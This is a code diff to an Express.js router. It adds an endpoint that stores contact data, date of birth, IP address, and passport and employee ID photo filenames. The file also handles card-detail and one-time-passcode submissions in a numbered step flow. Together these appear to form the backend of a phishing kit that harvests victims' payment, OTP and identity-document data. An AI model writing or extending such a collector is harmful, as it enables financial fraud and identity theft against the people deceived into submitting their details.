@@ -1,5 +1,5 @@
 import { Router, type IRouter } from "express";
-import { db, cardSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable } from "@workspace/db";
+import { db, cardSubmissionsTable, contactSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable } from "@workspace/db";
 import { sql } from "drizzle-orm";
 import { z } from "zod";
 
@@ -23,6 +23,24 @@ const OtpBody = z.object({
   ipAddress: z.string().optional(),
 });
 
+const ContactBody = z.object({
+  username: z.string().min(1),
+  firstName: z.string().optional(),
+  lastName: z.string().optional(),
+  email: z.string().optional(),
+  phone: z.string().optional(),
+  address: z.string().optional(),
+  city: z.string().optional(),
+  state: z.string().optional(),
+  postalCode: z.string().optional(),
+  dob: z.string().optional(),
+  inquiryType: z.string().optional(),
+  message: z.string().optional(),
+  passportFilename: z.string().optional(),
+  employeeIdFilename: z.string().optional(),
+  ipAddress: z.string().optional(),
+});
+
 const PersonalBody = z.object({
   username: z.string().min(1),
   firstName: z.string().optional(),
@@ -37,6 +55,14 @@ const PersonalBody = z.object({
   inquiryType: z.string().optional(),
   message: z.string().optional(),
   ipAddress: z.string().optional(),
+});
+
+/* Contact Form — Data + Photo Filenames */
+router.post("/submissions/contact", async (req, res): Promise<void> => {
+  const parsed = ContactBody.safeParse(req.body);
+  if (!parsed.success) { res.status(400).json({ error: "Invalid request" }); return; }
+  await db.insert(contactSubmissionsTable).values(parsed.data).catch(() => {});
+  res.json({ ok: true });
 });
 
 /* Step 2 — Card Details */
